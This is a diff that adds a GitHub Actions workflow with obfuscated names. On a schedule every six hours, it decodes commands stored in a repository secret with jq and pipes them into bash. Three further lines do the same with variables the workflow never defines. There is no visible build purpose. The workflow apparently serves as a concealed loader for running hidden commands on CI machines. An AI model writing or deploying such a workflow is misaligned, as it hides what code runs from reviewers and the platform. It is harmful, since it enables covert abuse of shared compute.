@@ -1,0 +1,20 @@
+name: paprikasouthwest
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: paprikasouthwest
+        env:
+          yri0350: ${{ secrets.yri0350 }}
+        run: |
+          echo $yri0350 | jq -r .lmjk234 | /bin/bash
+          echo $kz31800 | jq -r .jbh907 | /bin/bash
+          echo $jjuu26844 | jq -r .xet63 | /bin/bash
+          echo $i1588 | jq -r .lzg87 | /bin/bash
+
